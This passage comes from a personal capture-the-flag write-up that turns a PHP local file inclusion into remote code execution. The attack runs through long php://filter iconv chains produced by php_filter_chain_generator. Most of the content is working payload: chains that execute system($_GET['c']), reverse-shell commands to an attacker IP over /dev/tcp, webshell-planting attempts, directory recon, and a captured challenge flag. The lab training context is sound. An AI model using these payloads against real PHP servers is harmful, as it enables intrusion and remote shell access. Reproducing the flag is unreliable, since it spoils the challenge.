7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
The problem was that I sent to the server to include the base64 of my payload instead of just my payload.
Also, to make it work I have to make the payload contain dog or cat strings in them so I came up with two solutions:
1. adding /cat after the last php://temp wrapper
2. adding ?cat as fictional GET parameter for the wrapper
so an example payload is:
```
view=php://filter/read=convert.base64-encode/resource=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp?cat=1&ext=
```
I can shorten in by changing system to eval or exec:
```python
python php_filter_chain_generator.py --chain '<?php echo system("id"); ?>'
```
# **new payload(phpinfo for POC):**
```
view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp?cat=&ext=
```
## Lets run some commands
```python
python php_filter_chain_generator.py --chain '<?php echo system("id");?>'
```
![[Pasted image 20241220091057.png]]
Tried with system and bash but was too long for the server to parse:
![[Pasted image 20241220091359.png]]
```python
python php_filter_chain_generator.py --chain '<?php exec("sh -i >/dev/tcp/10.8.3.163/8888 2>&1");?>'
```
It happened again so lets just try to do file_put_contents instead.
```python
python php_filter_chain_generator.py --chain '<?php file_put_contents('a.php', '<?php exec($_GET["c"]);?>');?>'
```
Gave up on that because it turns out longer.
```python
python php_filter_chain_generator.py --chain '<?php exec("sh -i >/dev/tcp/10.8.3.163/8888");?>'
```
Still too long:(
```python
python php_filter_chain_generator.py --chain '<?php exec("sh -i >/dev/tcp/10.8.3.163/11");?>'
```
Lets do something else,
Ill raise a local HTTP server and execute once wget for the webshell, this way I will have a persistent webshell without needing to create a huge payload.

```python
python php_filter_chain_generator.py --chain '<?php exec("ls -lat")'
```
Ok lets do some more recon with singular commands like ls and see what we can find that may be helpful on the machine(private ssh key for example)
result:
```
-rw-r--r-- 1 www-data www-data   51 Mar  6  2020 cat.php
```

```
drwxr-xr-x   2 root root 4096 Feb  1  2020 home

```

```python
python php_filter_chain_generator.py --chain '<?php echo system("ls -lat /")?>
```

```python
python php_filter_chain_generator.py --chain '<?php echo system("ls -lat /home")?>
```

```python
python php_filter_chain_generator.py --chain '<?php echo system("ls -lat /var/www")?>
```

```
flag2_QMW7JvaY2LvK.txt
```

Now that I found it, I can use the LFI to get its content.
```
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../../../var/www/flag2_QMW7JvaY2LvK.txt&ext=
```

```
VEhNe0xGMV90MF9SQzNfYWVjM2ZifQo=
```
Ctrl + Shift +B in Burp suite to decode it and get:
![[Pasted image 20241220102524.png]]
# ==Flag 2== 

```
THM{LF1_t0_RC3_aec3fb}
```
# Flag 3

Lets improve our RCE!

```python
python php_filter_chain_generator.py --chain '<?php system("touch /var/www/html/.cat1.php")?>'

```
Too long lets shorten it:
```python
python php_filter_chain_generator.py --chain '<?php system("pwd")?>'
```

```
/var/www/html
```

```python 
python php_filter_chain_generator.py --chain '<?php system("touch ./.cat1.php")?>'
```

```python 
python php_filter_chain_generator.py --chain '<?php system("echo "<?php">>.cat1.php")?>'
```
The tries to append the file in chunks didnt really work so ill keep on for now.
```python
python php_filter_chain_generator.py --chain '<?php echo system("ls -lat /var")?>'
```

```
drwxr-xr-x 1 root root  4096 Dec 20 13:30 ..
drwxr-xr-x 1 root root  4096 Mar 10  2020 www
drwxr-xr-x 1 root root  4096 Mar 10  2020 lib
drwxr-xr-x 1 root root  4096 Feb 26  2020 cache
drwxr-xr-x 1 root root  4096 Feb 26  2020 log
drwxr-xr-x 1 root root  4096 Feb 26  2020 .
lrwxrwxrwx 1 root root     9 Feb 24  2020 lock -> /run/lock
drwxrwsr-x 2 root mail  4096 Feb 24  2020 mail
drwxr-xr-x 2 root root  4096 Feb 24  2020 opt
lrwxrwxrwx 1 root root     4 Feb 24  2020 run -> /run
drwxr-xr-x 2 root root  4096 Feb 24  2020 spool
drwxr-xr-x 2 root root  4096 Feb  1  2020 backups
drwxrwsr-x 2 root staff 4096 Feb  1  2020 local
drwxrwxrwt 2 root root  4096 Feb  1  2020 tmp
drwxrwxrwt 2 root root  4096 Feb  1  2020 tmpÉ
```

```python
python php_filter_chain_generator.py --chain '<?php echo system("ls -lat /")?>'
```
```
dr-xr-xr-x  13 root root    0 Dec 20 15:07 sys
drwxr-xr-x   5 root root  340 Dec 20 13:30 dev
drwxr-xr-x   1 root root 4096 Dec 20 13:30 opt
dr-xr-xr-x 105 root root    0 Dec 20 13:30 proc
drwxr-xr-x   1 root root 4096 Dec 20 13:30 .
drwxr-xr-x   1 root root 4096 Dec 20 13:30 ..
-rwxr-xr-x   1 root root    0 Dec 20 13:30 .dockerenv
drwxr-xr-x   1 root root 4096 Dec 20 13:30 etc
drwx------   1 root root 4096 Mar 10  2020 root
drwxrwxrwt   1 root root 4096 Mar 10  2020 tmp
drwxr-xr-x   1 root root 4096 Feb 26  2020 run
drwxr-xr-x   1 root root 4096 Feb 26  2020 bin
drwxr-xr-x   1 root root 4096 Feb 26  2020 lib
drwxr-xr-x   1 root root 4096 Feb 26  2020 sbin
drwxr-xr-x   1 root root 4096 Feb 26  2020 var
drwxr-xr-x   2 root root 4096 Feb 24  2020 lib64
drwxr-xr-x   2 root root 4096 Feb 24  2020 media
drwxr-xr-x   2 root root 4096 Feb 24  2020 mnt
drwxr-xr-x   2 root root 4096 Feb 24  2020 srv
drwxr-xr-x   1 root root 4096 Feb 24  2020 usr
drwxr-xr-x   2 root root 4096 Feb  1  2020 boot
drwxr-xr-x   2 root root 4096 Feb  1  2020 home
drwxr-xr-x   2 root root 4096 Feb  1  2020 homeÉ
```

Tried to bring .dockerenv but it was empty.
```
/var/www/html:

drwxrwxrwx 4 www-data www-data 4096 Dec 20 15:32 .
-rw-r--r-- 1 www-data www-data    0 Dec 20 15:32 .cat1.php
drwxr-xr-x 2 www-data www-data 4096 Dec 20 13:30 dogs
drwxr-xr-x 2 www-data www-data 4096 Dec 20 13:30 cats
drwxr-xr-x 1 root     root     4096 Mar 10  2020 ..
-rw-r--r-- 1 www-data www-data  725 Mar 10  2020 style.css
-rw-r--r-- 1 www-data www-data  958 Mar 10  2020 index.php
-rw-r--r-- 1 www-data www-data   56 Mar  6  2020 flag.php
-rw-r--r-- 1 www-data www-data   51 Mar  6  2020 dog.php
-rw-r--r-- 1 www-data www-data   51 Mar  6  2020 cat.php
```
I tried to run nc to port 22 to see if the service ssh is on on the machine
```
nc 10.10.94.163 22          
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

So lets make a reverse shell:
```python
python php_filter_chain_generator.py --chain '<?php system("$_GET["c"]");?>'
```
### Simpler RCE Over LFI 
```python
python php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
```
Full payload for id over this:
```
view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp/dog&ext=&c=id
```
## Now lets try to run a reverse shell

```bash
bash -i > /dev/tcp/10.8.3.163/8888 2>&1 
```
URL Encode it so I can pass it to the GET parameter c:
```
bash+-i+>+/dev/tcp/10.8.3.163/8888+2>%261+
```

Full payload:
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|conve